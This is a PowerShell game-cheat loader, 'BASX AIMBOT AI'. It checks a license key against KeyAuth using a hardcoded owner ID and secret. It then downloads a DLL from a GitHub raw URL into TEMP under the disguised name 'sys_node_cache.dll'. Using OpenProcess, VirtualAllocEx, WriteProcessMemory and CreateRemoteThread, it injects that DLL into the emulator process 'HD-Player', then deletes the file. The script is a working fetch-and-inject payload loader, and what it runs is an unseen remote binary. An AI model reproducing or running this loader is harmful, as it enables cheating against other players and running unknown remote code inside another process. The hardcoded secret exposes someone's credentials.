$Name    = "Relaxwtf777's Application"
$OwnerID = "W404AorT6U"
$Secret  = "bdd0ab6c75599fffdb5ad43d22a82fe8bf8fa0fbd92dfdfbb2df80dc6d105d38"
$Version = "1.0"

function Show-Auth {
    Clear-Host
    Write-Host "==============================" -ForegroundColor Cyan
    Write-Host "    BASX AIMBOT AI v$Version" -ForegroundColor Cyan
    Write-Host "==============================" -ForegroundColor Cyan
    
    $initUrl = "https://keyauth.win/api/1.2/?type=init&name=$($Name -replace ' ', '%20')&ownerid=$OwnerID&secret=$Secret&version=$Version"
    try {
        $initRes = Invoke-RestMethod -Uri $initUrl -Method Get
        if ($initRes.success -ne $true) {
            Write-Host "[-] Init Failed: $($initRes.message)" -ForegroundColor Red
            return $false
        }
        $sessionId = $initRes.sessionid
    } catch {
        Write-Host "[!] Connection Error: Cannot reach KeyAuth server." -ForegroundColor Red
        return $false
    }

    $key = Read-Host " Enter License Key"
    $hwid = (Get-CimInstance Win32_ComputerSystemProduct).UUID
    $loginUrl = "https://keyauth.win/api/1.2/?type=license&key=$key&hwid=$hwid&sessionid=$sessionId&name=$($Name -replace ' ', '%20')&ownerid=$OwnerID"
    
    try {
        $loginRes = Invoke-RestMethod -Uri $loginUrl -Method Get
        if ($loginRes.success -eq $true) {
            Write-Host "[+] Login Success! Welcome." -ForegroundColor Green
            Start-Sleep -Seconds 1
            return $true
        } else {
            Write-Host "[-] Error: $($loginRes.message)" -ForegroundColor Red
            return $false
        }
    } catch {
        Write-Host "[!] Auth Error: Validation failed." -ForegroundColor Red
        return $false
    }
}

if (Show-Auth) {
    $dllUrl = "https://raw.githubusercontent.com/relaxhaha56-maker/node-storage-33/refs/heads/main/AimbotFemaleFix.dll"
    $tempPath = "$env:TEMP\sys_node_cache.dll"
    $targetProc = "HD-Player"

    Write-Host "[*] Syncing data with node-storage..." -ForegroundColor Yellow
    try {
        Invoke-WebRequest -Uri $dllUrl -OutFile $tempPath -ErrorAction Stop
    } catch {
        Write-Host "[!] Failed to download DLL." -ForegroundColor Red
        exit
    }

    $Source = @"
    using System;
    using System.Runtime.InteropServices;
    using System.Diagnostics;
    using System.Text;
    public class NodeHandler {
        [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto)] public static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)] static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll", SetLastError = true)] static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")] static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        public static void StartNode(string path, string pName) {
            Process[] target = Process.GetProcessesByName(pName);
            if (target.Length == 0) return;
            IntPtr hProc = OpenProcess(0x001F0FFF, false, target[0].Id);
            IntPtr addr = VirtualAllocEx(hProc, IntPtr.Zero, (uint)path.Length + 1, 0x3000, 0x40);
            IntPtr outSize;
            WriteProcessMemory(hProc, addr, Encoding.Default.GetBytes(path), (uint)path.Length + 1, out outSize);
            IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            CreateRemoteThread(hProc, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
        }
    }
"@
    Add-Type -TypeDefinition $Source
    [NodeHandler]::StartNode($tempPath, $targetProc)
    Write-Host "[+] Injection Completed. Aimbot Active." -ForegroundColor Green
    Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
} else {
    Write-Host "Closing in 3 seconds..."
    Start-Sleep -Seconds 3
}
